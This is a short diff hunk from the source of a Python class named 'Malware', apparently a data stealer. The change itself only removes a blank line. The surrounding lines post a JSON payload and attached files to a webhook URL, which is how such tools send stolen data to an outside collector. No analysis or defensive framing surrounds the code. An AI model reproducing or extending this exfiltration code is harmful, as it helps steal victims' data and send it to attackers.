@@ -131,7 +131,6 @@ class Malware:
                     requests.post(self.webhook_url + "?with_components=true", data={"payload_json": json.dumps(payload)}, files=files)
             else:
                 requests.post(self.webhook_url + "?with_components=true", json=payload)
-
         except Exception as e:
             print("Erro:", e)
 
